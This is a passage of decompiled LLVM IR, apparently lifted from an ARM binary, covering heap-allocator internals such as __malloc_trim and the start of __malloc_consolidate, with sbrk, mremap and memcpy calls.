  br i1 %v9_29798, label %dec_label_pc_2980c, label %dec_label_pc_297a0

dec_label_pc_297a0:                               ; preds = %dec_label_pc_2976c
  %v2_297a0 = sub i32 %v1_29588, %v3_29778
  store i32 %v2_297a0, i32* %r0.global-to-local, align 4
  %v2_297a4 = add i32 %v3_29778, %v1_2958c
  store i32 %v2_297a4, i32* %r1.global-to-local, align 4
  store i32 %v3_29790, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v4_297b0 = call i32 @mremap(i32 %v2_297a0, i32 %v2_297a4, i32 %v3_29790, i32 1)
  store i32 %v4_297b0, i32* %r0.global-to-local, align 4
  %v7_297b4 = icmp eq i32 %v4_297b0, -1
  br i1 %v7_297b4, label %dec_label_pc_29800, label %dec_label_pc_297bc

dec_label_pc_297bc:                               ; preds = %dec_label_pc_297a0
  %v1_297bc = load i32, i32* @r4, align 4
  %v2_297bc = add i32 %v1_297bc, %v4_297b0
  store i32 %v2_297bc, i32* %r0.global-to-local, align 4
  %v0_297c0 = load i32, i32* @fp, align 4
  %v1_297c0 = or i32 %v0_297c0, 2
  store i32 %v1_297c0, i32* %r3.global-to-local, align 4
  %v2_297c4 = add i32 %v2_297bc, 4
  %v3_297c4 = inttoptr i32 %v2_297c4 to i32*
  store i32 %v1_297c0, i32* %v3_297c4, align 4
  %v0_297c8 = load i32, i32* @r8, align 4
  %v1_297c8 = add i32 %v0_297c8, 868
  %v2_297c8 = inttoptr i32 %v1_297c8 to i32*
  %v3_297c8 = load i32, i32* %v2_297c8, align 4
  store i32 %v3_297c8, i32* %r3.global-to-local, align 4
  %v1_297cc = add i32 %v0_297c8, 880
  %v2_297cc = inttoptr i32 %v1_297cc to i32*
  %v3_297cc = load i32, i32* %v2_297cc, align 4
  store i32 %v3_297cc, i32* %r2.global-to-local, align 4
  %v0_297d0 = load i32, i32* @r6, align 4
  %v2_297d0 = sub i32 %v3_297c8, %v0_297d0
  store i32 %v2_297d0, i32* %r3.global-to-local, align 4
  %v1_297d4 = load i32, i32* @r7, align 4
  %v2_297d4 = add i32 %v1_297d4, %v2_297d0
  store i32 %v2_297d4, i32* %r1.global-to-local, align 4
  %v1_297d8 = add i32 %v0_297c8, 872
  %v2_297d8 = inttoptr i32 %v1_297d8 to i32*
  %v3_297d8 = load i32, i32* %v2_297d8, align 4
  store i32 %v3_297d8, i32* %r3.global-to-local, align 4
  %v1_297e0 = add i32 %v0_297c8, 884
  %v2_297e0 = inttoptr i32 %v1_297e0 to i32*
  %v3_297e0 = load i32, i32* %v2_297e0, align 4
  store i32 %v3_297e0, i32* %r2.global-to-local, align 4
  %tmp42 = icmp ugt i32 %v2_297d4, %v3_297cc
  br i1 %tmp42, label %bb33, label %bb34

bb33:                                             ; preds = %dec_label_pc_297bc
  store i32 %v2_297d4, i32* %v2_297cc, align 4
  %v0_297e8.pre = load i32, i32* %r1.global-to-local, align 4
  %v1_297e8.pre = load i32, i32* @r8, align 4
  br label %bb34

bb34:                                             ; preds = %dec_label_pc_297bc, %bb33
  %v1_297e8 = phi i32 [ %v0_297c8, %dec_label_pc_297bc ], [ %v1_297e8.pre, %bb33 ]
  %v0_297e8 = phi i32 [ %v2_297d4, %dec_label_pc_297bc ], [ %v0_297e8.pre, %bb33 ]
  %v2_297e8 = add i32 %v1_297e8, 868
  %v3_297e8 = inttoptr i32 %v2_297e8 to i32*
  store i32 %v0_297e8, i32* %v3_297e8, align 4
  %v0_297ec = load i32, i32* %r1.global-to-local, align 4
  %v1_297ec = load i32, i32* %r3.global-to-local, align 4
  %v2_297ec = add i32 %v1_297ec, %v0_297ec
  store i32 %v2_297ec, i32* %r1.global-to-local, align 4
  %v1_297f0 = load i32, i32* %r2.global-to-local, align 4
  %v0_297f4 = load i32, i32* %r0.global-to-local, align 4
  %v1_297f4 = add i32 %v0_297f4, 8
  store i32 %v1_297f4, i32* @r4, align 4
  %tmp43 = icmp ugt i32 %v2_297ec, %v1_297f0
  br i1 %tmp43, label %bb35, label %dec_label_pc_29838

bb35:                                             ; preds = %bb34
  %v5_297f8 = load i32, i32* @r8, align 4
  %v6_297f8 = add i32 %v5_297f8, 884
  %v7_297f8 = inttoptr i32 %v6_297f8 to i32*
  store i32 %v2_297ec, i32* %v7_297f8, align 4
  br label %dec_label_pc_29838

dec_label_pc_29800:                               ; preds = %dec_label_pc_297a0
  %v0_29800 = load i32, i32* @sb, align 4
  %v1_29800 = add i32 %v0_29800, 4
  store i32 %v1_29800, i32* %r3.global-to-local, align 4
  %v0_29804 = load i32, i32* @r6, align 4
  %v3_29804 = icmp ult i32 %v0_29804, %v1_29800
  br i1 %v3_29804, label %dec_label_pc_29814, label %dec_label_pc_29800.dec_label_pc_2980c_crit_edge

dec_label_pc_29800.dec_label_pc_2980c_crit_edge:  ; preds = %dec_label_pc_29800
  %v0_2980c.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_2980c

dec_label_pc_2980c:                               ; preds = %dec_label_pc_29800.dec_label_pc_2980c_crit_edge, %dec_label_pc_2976c
  %v0_2980c = phi i32 [ %v0_2980c.pre, %dec_label_pc_29800.dec_label_pc_2980c_crit_edge ], [ %v0_29574, %dec_label_pc_2976c ]
  store i32 %v0_2980c, i32* @r4, align 4
  br label %dec_label_pc_29838

dec_label_pc_29814:                               ; preds = %dec_label_pc_29800
  %v1_29814 = add i32 %v0_29800, -7
  store i32 %v1_29814, i32* %r0.global-to-local, align 4
  %v1_29818 = call i32 @malloc(i32 %v1_29814)
  store i32 %v1_29818, i32* @r0, align 4
  store i32 %v1_29818, i32* @r4, align 4
  %v2_2981c = icmp eq i32 %v1_29818, 0
  br i1 %v2_2981c, label %dec_label_pc_29838, label %dec_label_pc_29824

dec_label_pc_29824:                               ; preds = %dec_label_pc_29814
  %v0_29824 = load i32, i32* @r6, align 4
  %v1_29824 = add i32 %v0_29824, -8
  store i32 %v1_29824, i32* @r2, align 4
  %v0_29828 = load i32, i32* @r5, align 4
  store i32 %v0_29828, i32* @r1, align 4
  %v0_2982c = call i32 @memcpy()
  %v0_29830 = load i32, i32* @r5, align 4
  store i32 %v0_29830, i32* @r0, align 4
  %v0_29834 = call i32 @free()
  store i32 %v0_29834, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_29838

dec_label_pc_29838:                               ; preds = %bb31, %bb35, %bb34, %dec_label_pc_29814, %dec_label_pc_2980c, %dec_label_pc_29764, %.thread6, %dec_label_pc_295d4, %dec_label_pc_29824
  store i32 %v2_29528, i32* %r0.global-to-local, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 76, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_44990.1184 to i32), i32* %r2.global-to-local, align 4
  %v4_29848 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_44990.1184 to i32), i32 76) to i32*), align 4
  store i32 %v4_29848, i32* @ip, align 4
  call void @__pseudo_branch(i32 %v4_29848)
  br label %dec_label_pc_29854

dec_label_pc_29854:                               ; preds = %dec_label_pc_2955c, %dec_label_pc_29504, %dec_label_pc_294ec, %dec_label_pc_29838
  %v0_29854 = load i32, i32* @r4, align 4
  store i32 %v0_29854, i32* %r0.global-to-local, align 4
  store i32 %v3_294cc, i32* @r4, align 4
  store i32 %v6_294cc, i32* @r5, align 4
  store i32 %v9_294cc, i32* @r6, align 4
  store i32 %v12_294cc, i32* @r7, align 4
  store i32 %v15_294cc, i32* @r8, align 4
  store i32 %v18_294cc, i32* @sb, align 4
  store i32 %v21_294cc, i32* @sl, align 4
  store i32 %v24_294cc, i32* @fp, align 4
  store i32 %v27_294cc, i32* @lr, align 4
  ret i32 %v0_29854

; uselistorder directives
  uselistorder i32 %v2_297ec, { 1, 0, 2 }
  uselistorder i32 %v2_297d4, { 1, 2, 0, 3 }
  uselistorder i32 %v4_297b0, { 1, 0, 2 }
  uselistorder i32 %v3_29790, { 1, 0, 2, 3 }
  uselistorder i32 %v1_29734, { 2, 1, 0 }
  uselistorder i32 %v2_29704, { 1, 0, 2 }
  uselistorder i32 %v0_29698, { 1, 0 }
  uselistorder i32 %v1_29654, { 0, 2, 1, 3, 4, 5 }
  uselistorder i32 %v3_295b8, { 0, 2, 1, 3 }
  uselistorder i32 %v2_295b0, { 1, 2, 3, 0, 4, 5, 6 }
  uselistorder i32 %v1_29594, { 3, 5, 0, 1, 2, 4, 6 }
  uselistorder i32 %v1_2958c, { 0, 7, 5, 1, 2, 3, 4, 6, 8, 9 }
  uselistorder i32 %v1_29588, { 2, 3, 0, 1, 4 }
  uselistorder i1 %v2_29578, { 1, 0 }
  uselistorder i32 %v0_29574, { 2, 0, 1, 3, 4 }
  uselistorder i32 %v0_29554, { 1, 0 }
  uselistorder i32* %r3.global-to-local, { 0, 6, 1, 2, 3, 4, 5, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 0 }
  uselistorder i32* %r0.global-to-local, { 0, 1, 2, 3, 4, 5, 7, 6, 12, 8, 9, 10, 11, 23, 13, 15, 14, 16, 22, 24, 17, 18, 19, 20, 21, 27, 26, 25, 28, 30, 29 }
  uselistorder i32 %arg2, { 3, 2, 1, 0, 4 }
  uselistorder label %dec_label_pc_29854, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_29838, { 8, 3, 4, 1, 2, 5, 6, 0, 7 }
  uselistorder label %bb34, { 1, 0 }
  uselistorder label %dec_label_pc_29764, { 1, 0 }
  uselistorder label %dec_label_pc_29704, { 1, 2, 0 }
  uselistorder label %.thread6, { 4, 0, 1, 2, 3 }
  uselistorder label %dec_label_pc_29650, { 1, 2, 0 }
  uselistorder label %dec_label_pc_29644, { 1, 0 }
  uselistorder label %dec_label_pc_29640, { 1, 0 }
  uselistorder label %bb29, { 1, 0 }
  uselistorder label %bb27, { 1, 0 }
}

define i32 @function_29868(i32 %arg1) local_unnamed_addr {
dec_label_pc_29868:
  %v0_29868 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_29868, label %bb, label %.thread4

bb:                                               ; preds = %dec_label_pc_29868
  br label %.thread4

.thread4:                                         ; preds = %dec_label_pc_29868, %bb
  %v4_2987c = phi i32 [ %arg1, %dec_label_pc_29868 ], [ 0, %bb ]
  ret i32 %v4_2987c

; uselistorder directives
  uselistorder label %.thread4, { 1, 0 }
}

define i32 @__malloc_trim(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %v1_29880 = add i32 %arg2, 44
  %v2_29880 = inttoptr i32 %v1_29880 to i32*
  %v3_29880 = load i32, i32* %v2_29880, align 4
  %v12_29884 = load i32, i32* @r7, align 4
  %v1_29888 = add i32 %v3_29880, 4
  %v2_29888 = inttoptr i32 %v1_29888 to i32*
  %v3_29888 = load i32, i32* %v2_29888, align 4
  %v1_2988c = add i32 %arg2, 860
  %v2_2988c = inttoptr i32 %v1_2988c to i32*
  %v3_2988c = load i32, i32* %v2_2988c, align 4
  store i32 %v3_2988c, i32* @r4, align 4
  %v1_29890 = and i32 %v3_29888, -4
  store i32 %v1_29890, i32* @r6, align 4
  %v1_29894 = add i32 %v1_29890, -17
  %v2_29898 = add i32 %v1_29894, %v3_2988c
  store i32 %arg2, i32* @r5, align 4
  %v2_298a4 = sub i32 %v2_29898, %arg1
  store i32 %v3_2988c, i32* %r1.global-to-local, align 4
  %v2_298ac = udiv i32 %v2_298a4, %v3_2988c
  %v1_298b0 = add i32 %v2_298ac, -1
  store i32 %v1_298b0, i32* %r0.global-to-local, align 4
  %v2_298b4 = mul i32 %v1_298b0, %v3_2988c
  store i32 %v2_298b4, i32* @r7, align 4
  %v2_298b8 = icmp eq i32 %v2_298b4, 0
  store i1 %v2_298b8, i1* @cpsr_z, align 1
  %tmp8 = icmp slt i32 %v2_298b4, 1
  br i1 %tmp8, label %dec_label_pc_29920, label %dec_label_pc_298c0

dec_label_pc_298c0:                               ; preds = %entry
  store i32 0, i32* %r0.global-to-local, align 4
  %v1_298c4 = call i32 @__GI_sbrk(i32 0)
  store i32 %v1_298c4, i32* %r0.global-to-local, align 4
  %v0_298c8 = load i32, i32* @r5, align 4
  %v1_298c8 = add i32 %v0_298c8, 44
  %v2_298c8 = inttoptr i32 %v1_298c8 to i32*
  %v3_298c8 = load i32, i32* %v2_298c8, align 4
  %v0_298cc = load i32, i32* @r6, align 4
  %v2_298cc = add i32 %v0_298cc, %v3_298c8
  %v9_298d0 = icmp eq i32 %v1_298c4, %v2_298cc
  store i1 %v9_298d0, i1* @cpsr_z, align 1
  store i32 %v1_298c4, i32* @r4, align 4
  br i1 %v9_298d0, label %dec_label_pc_298dc, label %dec_label_pc_29920

dec_label_pc_298dc:                               ; preds = %dec_label_pc_298c0
  %v0_298dc = load i32, i32* @r7, align 4
  %v1_298dc = sub i32 0, %v0_298dc
  store i32 %v1_298dc, i32* %r0.global-to-local, align 4
  %v1_298e0 = call i32 @__GI_sbrk(i32 %v1_298dc)
  store i32 0, i32* %r0.global-to-local, align 4
  %v1_298e8 = call i32 @__GI_sbrk(i32 0)
  store i32 %v1_298e8, i32* %r0.global-to-local, align 4
  %v7_298ec = icmp eq i32 %v1_298e8, -1
  store i1 %v7_298ec, i1* @cpsr_z, align 1
  br i1 %v7_298ec, label %dec_label_pc_29920, label %dec_label_pc_298f4

dec_label_pc_298f4:                               ; preds = %dec_label_pc_298dc
  %v0_298f4 = load i32, i32* @r4, align 4
  %v2_298f4 = sub i32 %v0_298f4, %v1_298e8
  store i32 %v2_298f4, i32* %r0.global-to-local, align 4
  %v9_298f4 = icmp eq i32 %v0_298f4, %v1_298e8
  store i1 %v9_298f4, i1* @cpsr_z, align 1
  br i1 %v9_298f4, label %dec_label_pc_29920, label %dec_label_pc_298fc

dec_label_pc_298fc:                               ; preds = %dec_label_pc_298f4
  %v0_298fc = load i32, i32* @r5, align 4
  %v1_298fc = add i32 %v0_298fc, 872
  %v2_298fc = inttoptr i32 %v1_298fc to i32*
  %v3_298fc = load i32, i32* %v2_298fc, align 4
  %v1_29900 = load i32, i32* @r6, align 4
  %v2_29900 = sub i32 %v1_29900, %v2_298f4
  store i32 %v2_29900, i32* %r2.global-to-local, align 4
  %v1_29904 = add i32 %v0_298fc, 44
  %v2_29904 = inttoptr i32 %v1_29904 to i32*
  %v3_29904 = load i32, i32* %v2_29904, align 4
  store i32 %v3_29904, i32* %r1.global-to-local, align 4
  %v2_29908 = sub i32 %v3_298fc, %v2_298f4
  %v1_2990c = or i32 %v2_29900, 1
  store i32 %v1_2990c, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r0.global-to-local, align 4
  store i32 %v2_29908, i32* %v2_298fc, align 4
  %v0_29918 = load i32, i32* %r2.global-to-local, align 4
  %v1_29918 = load i32, i32* %r1.global-to-local, align 4
  %v2_29918 = add i32 %v1_29918, 4
  %v3_29918 = inttoptr i32 %v2_29918 to i32*
  store i32 %v0_29918, i32* %v3_29918, align 4
  %v1_2992c.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_29924

dec_label_pc_29920:                               ; preds = %dec_label_pc_298c0, %dec_label_pc_298f4, %dec_label_pc_298dc, %entry
  store i32 0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_29924

dec_label_pc_29924:                               ; preds = %dec_label_pc_298fc, %dec_label_pc_29920
  %v1_2992c = phi i32 [ %v1_2992c.pre, %dec_label_pc_298fc ], [ 0, %dec_label_pc_29920 ]
  store i32 %v12_29884, i32* @r7, align 4
  ret i32 %v1_2992c

; uselistorder directives
  uselistorder i1 %v7_298ec, { 1, 0 }
  uselistorder i32 %v1_298e8, { 2, 1, 0, 3 }
  uselistorder i32 %v3_2988c, { 0, 2, 1, 3, 4 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 0 }
  uselistorder i32* %r0.global-to-local, { 1, 2, 3, 4, 5, 7, 6, 10, 9, 8, 0 }
  uselistorder i32 872, { 7, 0, 1, 2, 3, 4, 5, 6 }
  uselistorder i32 (i32)* @__GI_sbrk, { 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %arg2, { 0, 2, 1, 3 }
  uselistorder label %dec_label_pc_29924, { 1, 0 }
  uselistorder label %dec_label_pc_29920, { 1, 2, 0, 3 }
}

define i32 @__malloc_consolidate() local_unnamed_addr {
entry:
  %fp.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  %stack_var_-36 = alloca i32, align 4
  %v3_29930 = load i32, i32* @r4, align 4
  store i32 %v3_29930, i32* %stack_var_-36, align 4
  %v0_29934 = load i32, i32* @r0, align 4
  %v1_29934 = inttoptr i32 %v0_29934 to i32*
  %v2_29934 = load i32, i32* %v1_29934, align 4
  store i32 %v2_29934, i32* %r3.global-to-local, align 4
  %v2_29938 = icmp eq i32 %v2_29934, 0
  store i32 %v0_29934, i32* @r4, align 4
  br i1 %v2_29938, label %dec_label_pc_29a70.preheader, label %dec_label_pc_2994c

dec_label_pc_29a70.preheader:                     ; preds = %entry
  store i32 2, i32* %r2.global-to-local, align 4
  %v1_29a7825 = add i32 %v0_29934, 52
  store i32 %v1_29a7825, i32* %r3.global-to-local, align 4
  %v2_29a8026 = add i32 %v0_29934, 60
  %v3_29a8027 = inttoptr i32 %v2_29a8026 to i32*
  store i32 %v1_29a7825, i32* %v3_29a8027, align 4
  %v0_29a8428 = load i32, i32* %r3.global-to-local, align 4
  %v2_29a8429 = add i32 %v0_29a8428, 12
  %v3_29a8430 = inttoptr i32 %v2_29a8429 to i32*
  store i32 %v0_29a8428, i32* %v3_29a8430, align 4
  br label %dec_label_pc_29a70.dec_label_pc_29a70_crit_edge

dec_label_pc_2994c:                               ; preds = %entry
  %v1_2994c = and i32 %v2_29934, -3
  %v3_29950 = udiv i32 %v2_29934, 8
  store i32 %v3_29950, i32* %r2.global-to-local, align 4
  store i32 %v1_2994c, i32* %v1_29934, align 4
  %v0_29958 = load i32, i32* @r0, align 4
  %v1_29958 = add i32 %v0_29958, -4
  store i32 %v1_29958, i32* %r3.global-to-local, align 4
  %v1_2995c = load i32, i32* %r2.global-to-local, align 4
  %v4_2995c = mul i32 %v1_2995c, 4
  %v5_2995c = add i32 %v4_2995c, %v1_29958
  store i32 %v5_2995c, i32* %sb.global-to-local, align 4
  %v1_29960 = add i32 %v0_29958, 52
  store i32 %v1_29960, i32* %r7.global-to-local, align 4
  %v1_29964 = add i32 %v0_29958, 4
  store i32 %v1_29964, i32* %r6.global-to-local, align 4
  store i32 0, i32* %fp.global-to-local, align 4
  br label %dec_label_pc_2996c

dec_label_pc_2996c:                               ; preds = %dec_label_pc_29a68, %dec_label_pc_2994c
  %v1_29a6010 = phi i32 [ %v1_29a60, %dec_label_pc_29a68 ], [ %v5_2995c, %dec_label_pc_2994c ]
  %v1_29978 = phi i32 [ %v1_29a68, %dec_label_pc_29a68 ], [ %v1_29964, %dec_label_pc_2994c ]
  %v1_2996c = inttoptr i32 %v1_29978 to i32*
  %v2_2996c = load i32, i32* %v1_2996c, align 4
  store i32 %v2_2996c, i32* %r1.global-to-local, align 4
  %v2_29970 = icmp eq i32 %v2_2996c, 0
  br i1 %v2_29970, label %dec_label_pc_29a60, label %dec_label_pc_29978

dec_label_pc_29978:                               ; preds = %dec_label_pc_2996c
  %v0_29978 = load i32, i32* %fp.global-to-local, align 4
  store i32 %v0_29978, i32* %v1_2996c, align 4
  %v0_2997c.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_2997c

dec_label_pc_2997c:                               ; preds = %dec_label_pc_29a54, %dec_label_pc_29978
  %v0_29998 = phi i32 [ %v0_29a54, %dec_label_pc_29a54 ], [ %v0_2997c.pre, %dec_label_pc_29978 ]
  %v1_2997c = add i32 %v0_29998, 4
  %v2_2997c = inttoptr i32 %v1_2997c to i32*
  %v3_2997c = load i32, i32* %v2_2997c, align 4
  store i32 %v3_2997c, i32* %r3.global-to-local, align 4
  %v1_29980 = and i32 %v3_2997c, -2
  store i32 %v1_29980, i32* %lr.global-to-local, align 4
  %v2_29984 = add i32 %v1_29980, %v0_29998
  store i32 %v2_29984, i32* @r0, align 4
  %v1_29988 = urem i32 %v3_2997c, 2
  %v2_29988 = icmp eq i32 %v1_29988, 0
  %v1_2998c = add i32 %v0_29998, 8
  %v2_2998c = inttoptr i32 %v1_2998c to i32*
  %v3_2998c = load i32, i32* %v2_2998c, align 4
  store i32 %v3_2998c, i32* %sl.global-to-local, align 4
  %v1_29990 = add i32 %v2_29984, 4
  %v2_29990 = inttoptr i32 %v1_29990 to i32*
  %v3_29990 = load i32, i32* %v2_29990, align 4
  store i32 %v3_29990, i32* %r8.global-to-local, align 4
  br i1 %v2_29988, label %dec_label_pc_29998, label %dec_label_pc_299cc

dec_label_pc_29998:                               ; preds = %dec_label_pc_2997c
  %v1_29998 = inttoptr i32 %v0_29998 to i32*
  %v2_29998 = load i32, i32* %v1_29998, align 4
  store i32 %v2_29998, i32* %r5.global-to-local, align 4
  %v2_2999c = sub i32 %v0_29998, %v2_29998
  store i32 %v2_2999c, i32* %r3.global-to-local, align 4
  %v1_299a0 = add i32 %v2_2999c, 8
  %v2_299a0 = inttoptr i32 %v1_299a0 to i32*
  %v3_299a0 = load i32, i32* %v2_299a0, align 4
  store i32 %v3_299a0, i32* @ip, align 4
  %v1_299a4 = add i32 %v3_299a0, 12
  %v2_299a4 = inttoptr i32 %v1_299a4 to i32*
  %v3_299a4 = load i32, i32* %v2_299a4, align 4
  store i32 %v3_299a4, i32* %r1.global-to-local, align 4
  %v9_299a8 = icmp eq i32 %v3_299a4, %v2_2999c
  %v1_299ac = add i32 %v2_2999c, 12
  %v2_299ac = inttoptr i32 %v1_299ac to i32*
  %v3_299ac = load i32, i32* %v2_299ac, align 4
  store i32 %v3_299ac, i32* %r2.global-to-local, align 4
  br i1 %v9_299a8, label %dec_label_pc_299b4, label %dec_label_pc_29a10

dec_label_pc_299b4:                               ; preds = %dec_label_pc_29998
  %v1_299b4 = add i32 %v3_299ac, 8
  %v2_299b4 = inttoptr i32 %v1_299b4 to i32*
  %v3_299b4 = load i32, i32* %v2_299b4, align 4
  store i32 %v3_299b4, i32* %r3.global-to-local, align 4
  %v9_299b8 = icmp eq i32 %v3_299b4, %v2_2999c
  br i1 %v9_299b8, label %dec_label_pc_299c0, label %dec_label_pc_29a10

dec_label_pc_299c0:                               ; preds = %dec_label_pc_299b4
  store i32 %v3_299a0, i32* %v2_299b4, align 4
  %v0_299c4 = load i32, i32* %r2.global-to-local, align 4
  %v1_299c4 = load i32, i32* @ip, align 4
  %v2_299c4 = add i32 %v1_299c4, 12
  %v3_299c4 = inttoptr i32 %v2_299c4 to i32*
  store i32 %v0_299c4, i32* %v3_299c4, align 4
  %v0_299c8 = load i32, i32* %lr.global-to-local, align 4
  %v1_299c8 = load i32, i32* %r5.global-to-local, align 4
  %v2_299c8 = add i32 %v1_299c8, %v0_299c8
  store i32 %v2_299c8, i32* %lr.global-to-local, align 4
  %v0_299d0.pre = load i32, i32* @r0, align 4
  %v0_299d4.pre = load i32, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_299cc

dec_label_pc_299cc:                               ; preds = %dec_label_pc_2997c, %dec_label_pc_299c0
  %v0_29a44 = phi i32 [ %v1_29980, %dec_label_pc_2997c ], [ %v2_299c8, %dec_label_pc_299c0 ]
  %v0_299d4 = phi i32 [ %v3_29990, %dec_label_pc_2997c ], [ %v0_299d4.pre, %dec_label_pc_299c0 ]
  %v1_299e8 = phi i32 [ %v2_29984, %dec_label_pc_2997c ], [ %v0_299d0.pre, %dec_label_pc_299c0 ]
  %v0_299cc = load i32, i32* @r4, align 4
  %v1_299cc = add i32 %v0_299cc, 44
  %v2_299cc = inttoptr i32 %v1_299cc to i32*
  %v3_299cc = load i32, i32* %v2_299cc, align 4
  store i32 %v3_299cc, i32* %r3.global-to-local, align 4
  %v9_299d0 = icmp eq i32 %v1_299e8, %v3_299cc
  %v1_299d4 = and i32 %v0_299d4, -4
  store i32 %v1_299d4, i32* %r5.global-to-local, align 4
  br i1 %v9_299d0, label %dec_label_pc_29a44, label %dec_label_pc_299dc

dec_label_pc_299dc:                               ; preds = %dec_label_pc_299cc
  %v2_299dc = add i32 %v1_299e8, %v1_299d4
  store i32 %v2_299dc, i32* %r3.global-to-local, align 4
  %v1_299e0 = add i32 %v2_299dc, 4
  %v2_299e0 = inttoptr i32 %v1_299e0 to i32*
  %v3_299e0 = load i32, i32* %v2_299e0, align 4
  store i32 %v3_299e0, i32* %r3.global-to-local, align 4
  %v1_299e4 = urem i32 %v3_299e0, 2
  %v2_299e4 = icmp eq i32 %v1_299e4, 0
  %v2_299e8 = add i32 %v1_299e8, 4
  %v3_299e8 = inttoptr i32 %v2_299e8 to i32*
  store i32 %v1_299d4, i32* %v3_299e8, align 4
  br i1 %v2_299e4, label %dec_label_pc_299f0, label %dec_label_pc_299dc.dec_label_pc_29a20_crit_edge

dec_label_pc_299dc.dec_label_pc_29a20_crit_edge:  ; preds = %dec_label_pc_299dc
  %v0_29a24.pre = load i32, i32* %lr.global-to-local, align 4
  br label %dec_label_pc_29a20

dec_label_pc_299f0:                               ; preds = %dec_label_pc_299dc
  %v0_299f0 = load i32, i32* @r0, align 4
  %v1_299f0 = add i32 %v0_299f0, 8
  %v2_299f0 = inttoptr i32 %v1_299f0 to i32*
  %v3_299f0 = load i32, i32* %v2_299f0, align 4
  store i32 %v3_299f0, i32* @ip, align 4
  %v1_299f4 = add i32 %v3_299f0, 12
  %v2_299f4 = inttoptr i32 %v1_299f4 to i32*
  %v3_299f4 = load i32, i32* %v2_299f4, align 4
  store i32 %v3_299f4, i32* %r3.global-to-local, align 4
  %v9_299f8 = icmp eq i32 %v3_299f4, %v0_299f0
  %v1_299fc = add i32 %v0_299f0, 12
  %v2_299fc = inttoptr i32 %v1_299fc to i32*
  %v3_299fc = load i32, i32* %v2_299fc, align 4
  store i32 %v3_299fc, i32* %r2.global-to-local, align 4
  br i1 %v9_299f8, label %dec_label_pc_29a04, label %dec_label_pc_29a10

dec_label_pc_29a04:                               ; preds = %dec_label_pc_299f0
  %v1_29a04 = add i32 %v3_299fc, 8
  %v2_29a04 = inttoptr i32 %v1_29a04 to i32*
  %v3_29a04 = load i32, i32* %v2_29a04, align 4
  store i32 %v3_29a04, i32* %r3.global-to-local, align 4
  %v9_29a08 = icmp eq i32 %v3_29a04, %v0_299f0
  br i1 %v9_29a08, label %dec_label_pc_29a14, label %dec_label_pc_29a10

dec_label_pc_29a10:                               ; preds = %dec_label_pc_299f0, %dec_label_pc_299b4, %dec_label_pc_29998, %dec_label_pc_29a04
  %v0_29a10 = call i32 @abort()
  store i32 %v0_29a10, i32* @r0, align 4
  %v0_29a14.pre = load i32, i32* @ip, align 4
  %v1_29a14.pre = load i32, i32* @r2, align 4
  br label %dec_label_pc_29a14

dec_label_pc_29a14:                               ; preds = %dec_label_pc_29a04, %dec_label_pc_29a10
  %v1_29a14 = phi i32 [ %v3_299fc, %dec_label_pc_29a04 ], [ %v1_29a14.pre, %dec_label_pc_29a10 ]
  %v0_29a14 = phi i32 [ %v3_299f0, %dec_label_pc_29a04 ], [ %v0_29a14.pre, %dec_label_pc_29a10 ]
  %v2_29a14 = add i32 %v1_29a14, 8
  %v3_29a14 = inttoptr i32 %v2_29a14 to i32*
  store i32 %v0_29a14, i32* %v3_29a14, align 4
  %v0_29a18 = load i32, i32* %r2.global-to-local, align 4
  %v1_29a18 = load i32, i32* @ip, align 4
  %v2_29a18 = add i32 %v1_29a18, 12
  %v3_29a18 = inttoptr i32 %v2_29a18 to i32*
  store i32 %v0_29a18, i32* %v3_29a18, align 4
  %v0_29a1c = load i32, i32* %lr.global-to-local, align 4
  %v1_29a1c = load i32, i32* %r5.global-to-local, align 4
  %v2_29a1c = add i32 %v1_29a1c, %v0_29a1c
  store i32 %v2_29a1c, i32* %lr.global-to-local, align 4
  br label %dec_label_pc_29a20

dec_label_pc_29a20:                               ; preds = %dec_label_pc_299dc.dec_label_pc_29a20_crit_edge, %dec_label_pc_29a14
  %v0_29a24 = phi i32 [ %v0_29a24.pre, %dec_label_pc_299dc.dec_label_pc_29a20_crit_edge ], [ %v2_29a1c, %dec_label_pc_29a14 ]
  %v0_29a20 = load i32, i32* %r7.global-to-local, align 4
  %v1_29a20 = add i32 %v0_29a20, 8
  %v2_29a20 = inttoptr i32 %v1_29a20 to i32*
  %v3_29a20 = load i32, i32* %v2_29a20, align 4
  store i32 %v3_29a20, i32* %r2.global-to-local, align 4
  %v1_29a24 = or i32 %v0_29a24, 1
  store i32 %v1_29a24, i32* %r3.global-to-local, align 4
  %v0_29a28 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v0_29a28, i32* %v2_29a20, align 4
  %v0_29a2c = load i32, i32* %r1.global-to-local, align 4
